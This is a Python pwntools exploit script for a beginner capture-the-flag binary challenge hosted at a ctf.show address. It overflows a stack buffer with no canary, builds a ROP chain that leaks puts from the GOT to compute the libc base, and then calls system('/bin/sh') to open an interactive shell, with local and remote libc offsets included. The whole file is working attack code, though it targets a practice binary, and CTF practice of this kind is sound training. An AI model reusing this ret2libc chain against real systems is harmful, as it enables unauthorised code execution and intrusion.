# -*- coding: utf-8 -*-

from pwn import *
import pwn

fileName = './萌新赛.签到题'
ip = 'pwn.challenge.ctf.show'
port = 28110

'''
[*] '/home/wkyuu/Desktop/萌新赛.签到题'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
'''

p64 = pwn.p64
u64 = pwn.u64

context(log_level = 'debug', os = 'linux', arch = 'amd64')
p = process(fileName)
# p = remote(ip, port)

def logger(msg, value=None, type='info'):  # type True for value
    if type == 'info':
        log.info(
            '================================ {} ================================\n'.format(msg))
    else:
        log.success('# {} => {}\n'.format(msg, value))

# bin
elf = ELF(fileName)
bin_func_main = elf.sym['main']
bin_puts_plt = elf.sym['puts']
bin_puts_got = elf.got['puts']
bin_pop_rdi_ret = 0x400793
bin_ret = 0x40053e

# local libc
libc_puts_offset = 0x77820
libc_system_offset = 0x4c330
libc_str_bin_sh_offset = 0x196031

# remote libc
# libc_puts_offset = 0x809c0
# libc_system_offset = 0x4f440
# libc_str_bin_sh_offset = 0x1b3e9a

gdbscript = '''
b *main+157
b *main+168
'''

# gdb.attach(p, gdbscript = gdbscript)

# leak libc
logger('leak libc')
payload = b'a' * (0x70 + 0x7) + b'b' + p64(bin_pop_rdi_ret) + p64(bin_puts_got) + p64(bin_puts_plt) + p64(bin_func_main)
p.sendlineafter(b'[+] command successful!\n', payload)
p.recvuntil(b'joke')

leak_puts_got = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = leak_puts_got - libc_puts_offset
libc_system = libc_base + libc_system_offset
libc_str_bin_sh = libc_base + libc_str_bin_sh_offset

logger('libc_base', hex(libc_base), 's')
logger('leak_puts_got', hex(leak_puts_got), 's')
logger('libc_system', hex(libc_system), 's')
logger('libc_str_bin_sh', hex(libc_str_bin_sh), 's')

# rop
logger('rop')
payload = b'a' * (0x70 + 0x8) + p64(bin_ret) + p64(bin_pop_rdi_ret) + p64(libc_str_bin_sh) + p64(libc_system)
p.sendlineafter(b'[+] command successful!\n', payload)
p.interactive()
